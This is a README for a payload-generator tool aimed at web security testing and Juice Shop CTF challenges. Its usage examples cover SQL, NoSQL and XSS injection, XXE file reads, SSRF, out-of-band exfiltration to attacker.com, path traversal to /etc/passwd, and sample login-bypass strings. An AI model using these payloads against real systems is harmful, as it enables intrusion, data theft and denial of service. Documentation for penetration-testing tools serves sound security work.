# payload-gen

Security payload generator for web testing.

## Installation

```bash
cargo build --release
# Binary: target/release/payload-gen
```

## Usage

### SQL Injection (sqli)

```bash
# Authentication bypass payloads
payload-gen sqli auth-bypass

# UNION-based column discovery
payload-gen sqli union 9

# Bypass for specific user
payload-gen sqli login admin@example.com

# Database-specific payloads
payload-gen sqli sqlite
payload-gen sqli mysql
payload-gen sqli postgresql

# Juice Shop specific
payload-gen sqli juice-shop
```

### XSS (xss)

```bash
# Basic payloads
payload-gen xss basic

# Filter bypass payloads
payload-gen xss bypass

# DOM-based XSS
payload-gen xss dom

# Polyglot payloads
payload-gen xss polyglot

# Encode a custom payload
payload-gen xss encode "<script>alert(1)</script>"

# Juice Shop specific
payload-gen xss juice-shop
```

### XXE (xxe)

```bash
# File read
payload-gen xxe file /etc/passwd

# SSRF via XXE
payload-gen xxe ssrf http://internal:8080/admin

# Billion Laughs DoS
payload-gen xxe dos

# Out-of-band exfiltration
payload-gen xxe oob http://attacker.com /etc/passwd

# Cloud metadata endpoints
payload-gen xxe cloud

# Juice Shop specific
payload-gen xxe juice-shop
```

### NoSQL Injection (nosql)

```bash
# Authentication bypass
payload-gen nosql auth-bypass

# Data exfiltration
payload-gen nosql exfil

# Blind regex extraction
payload-gen nosql blind email ""

# Juice Shop specific
payload-gen nosql juice-shop
```

### Path Traversal (traversal)

```bash
# Generate traversal payloads
payload-gen traversal 5 etc/passwd
# Arguments: depth, target_file
```

### Passwords (passwords)

```bash
# Top common passwords
payload-gen passwords top

# Identify hash type
payload-gen passwords identify "5f4dcc3b5aa765d61d8327deb882cf99"

# Generate variations
payload-gen passwords variations "password"

# Juice Shop credentials
payload-gen passwords juice-shop
```

### IDOR Testing (idor)

```bash
# Common IDOR endpoints
payload-gen idor endpoints

# Generate ID variations
payload-gen idor ids 5 10
# Arguments: current_id, range

# Juice Shop endpoints
payload-gen idor juice-shop
```

### Parameter Tampering (tampering)

```bash
# Negative value tests
payload-gen tampering negative quantity 1

# Mass assignment payloads
payload-gen tampering mass-assignment

# Privilege escalation tests
payload-gen tampering privilege 1

# Juice Shop specific
payload-gen tampering juice-shop
```

## Output Format

Each payload includes:
- **Name**: Descriptive name of the attack
- **Payload**: The actual payload to use

Example:
```
=== SQLi Authentication Bypass ===

OR 1=1              → ' OR 1=1--
Comment bypass      → admin'--
Hash comment        → ' OR 1=1#
```

## Use Cases

### CTF Challenges
- Quick access to common payloads
- Database-specific payloads
- Juice Shop challenge solutions

### Security Testing
- Comprehensive payload lists
- Multiple encoding options
- Context-specific payloads
